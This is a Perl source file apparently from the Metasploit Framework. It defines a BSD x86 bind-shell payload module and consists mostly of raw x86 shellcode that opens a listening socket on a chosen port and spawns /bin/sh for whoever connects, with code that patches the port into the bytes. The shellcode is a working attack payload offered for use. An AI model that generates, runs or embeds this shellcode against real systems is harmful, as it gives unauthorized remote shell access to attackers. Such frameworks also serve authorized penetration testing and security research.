package Msf::Payload::bsdx86_bind;
use strict;
use base 'Msf::Payload';

my $info =
{
    Name         => 'bsdx86bind',
    Version      => '1.0',
    Description  => 'Listen for connection and spawn a shell',
    Author       => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'bsd' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'bind_shell',
    Size         => '',
    UserOpts     =>
        {
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('LPORT')));
}

sub Generate
{
    my $self = shift;
    my $port = shift;
    my $off_port = 19;
    my $port_bin = pack("n", $port);

    my $shellcode =
    "\x31\xff\x97\x50\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x93\x97\x50".
    "\x68\x02\x00\x22\x11\x89\xe6\x6a\x10\x56\x53\xb0\x68\x50\xcd\x80".
    "\x97\x6a\x02\x53\xb0\x6a\x50\xcd\x80\x97\x50\x50\x53\xb0\x1e\x50".
    "\xcd\x80\x92\x6a\x02\x59\x97\x51\x52\xb0\x5a\x50\xcd\x80\x49\x79".
    "\xf5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe1".
    "\x50\x54\x51\xb0\x3b\x50\xcd\x80\x97\xb0\x01\x50\xcd\x80";

    substr($shellcode, $off_port, 2, $port_bin);
    return $shellcode;
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('4444');
    return length($bin);
}
